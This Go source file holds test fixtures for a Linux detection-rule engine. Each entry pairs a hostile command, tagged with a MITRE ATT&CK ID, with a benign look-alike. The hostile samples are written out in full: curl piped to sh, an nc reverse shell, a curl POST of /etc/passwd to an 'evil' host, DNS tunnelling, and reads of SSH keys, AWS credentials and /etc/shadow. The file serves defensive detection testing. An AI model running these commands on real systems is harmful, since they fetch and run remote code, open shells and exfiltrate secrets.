package api

// Linux fixtures. The "quiet" events are ordinary admin activity that a
// well-scoped rule must not flag.

func init() {
	sigFixtures = append(sigFixtures, []sigFixture{
		{"L-T1059.004a", fxProc("bash", "bash -c curl http://x/a.sh | sh"), fxProc("publish-tool", "publish-tool https://registry.example.com")},
		{"L-T1059.004b", fxProc("payload", "/tmp/payload"), fxProc("ls", "ls -l /home/a")},
		{"L-T1059.006", fxProc("python3", "python3 -c import socket,subprocess;socket.socket()"), fxProc("python3", "python3 manage.py migrate")},
		{"L-T1059.004c", fxProc("nc", "nc -e /bin/sh 10.0.0.5 4444"), fxProc("sync", "sync -c")},
		{"L-T1105", fxProc("curl", "curl -o /tmp/x http://evil/x"), fxProc("curl", "curl https://api.example.com/health")},
		{"L-T1087.001", fxProc("cat", "cat /etc/passwd"), fxProc("cat", "cat /etc/hostname")},
		{"L-T1046", fxProc("nmap", "nmap -sS 10.0.0.0/24"), fxProc("ls", "ls -l")},
		{"L-T1592", fxProc("tcpdump", "tcpdump -i eth0"), fxProc("ls", "ls -l")},
		{"L-T1590", fxProc("dig", "dig example.com"), fxProc("ghost-cms", "ghost-cms start")},
		{"L-T1548.001a", fxProc("chmod", "chmod u+s /tmp/x"), fxProc("chmod", "chmod 644 /tmp/x")},
		{"L-T1548.001b", fxProc("sudo", "sudo su"), fxProc("sudo", "sudo systemctl restart nginx")},
		{"L-T1547.006", fxProc("insmod", "insmod rootkit.ko"), fxProc("ls", "ls /lib/modules")},
		{"L-T1611", fxProc("nsenter", "nsenter --target 1 --mount"), fxProc("ls", "ls -l")},
		{"L-T1003.008", fxProc("cat", "cat /etc/shadow"), fxProc("cat", "cat /etc/hosts")},
		{"L-T1110.001", fxLogonMsg("Failed password for root from 1.2.3.4 port 22 ssh2"), fxLogonMsg("Accepted publickey for deploy from 10.0.0.5")},
		{"L-T1552.004", fxProc("cat", "cat /home/a/.ssh/id_rsa"), fxProc("cat", "cat /home/a/notes.txt")},
		{"L-T1552.005", fxProc("cat", "cat /home/a/.aws/credentials"), fxProc("cat", "cat /home/a/notes.txt")},
		{"L-T1053.003", fxFile("/etc/cron.d/evil"), fxFile("/etc/hosts")},
		{"L-T1543.002", fxFile("/etc/systemd/system/evil.service"), fxFile("/etc/systemd/system/README")},
		{"L-T1546.004", fxFile("/home/a/.bashrc"), fxFile("/home/a/notes.txt")},
		{"L-T1574.006", fxProc("sh", "LD_PRELOAD=/tmp/x.so ls"), fxProc("ls", "ls -l")},
		{"L-T1070.002", fxProc("history", "history -c"), fxProc("history", "history 20")},
		{"L-T1222.002", fxProc("chmod", "chmod 777 /srv/x"), fxProc("chmod", "chmod 640 /srv/x")},
		{"L-T1021.004", fxProc("ssh", "ssh -R 8080:localhost:80 jump"), fxProc("sshd", "/usr/sbin/sshd -D")},
		{"L-T1572", fxDNSEvent("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.com"), fxDNSEvent("www.example.com")},
		{"L-T1219", fxProc("anydesk", "anydesk --start"), fxProc("ls", "ls -l")},
		{"L-T1090.003", fxProc("proxychains", "proxychains nmap x"), fxProc("monitord", "monitord --check")},
		{"L-T1078.004", fxProc("curl", "curl http://169.254.169.254/latest/meta-data/"), fxProc("curl", "curl https://example.com")},
		{"L-T1048", fxProc("curl", "curl -X POST -d @/etc/passwd http://evil"), fxProc("curl", "curl https://example.com")},
		{"L-T1560", fxProc("tar", "tar czf /tmp/h.tgz /home/a"), fxProc("start-stop-daemon", "start-stop-daemon --start /etc/init.d/x")},
		{"L-T1567", fxProc("curl", "curl https://transfer.sh/x"), fxProc("curl", "curl https://example.com")},
		{"L-DLP-010", fxProc("mysqldump", "mysqldump db"), fxProc("mysql", "mysql -e select1")},
	}...)
}
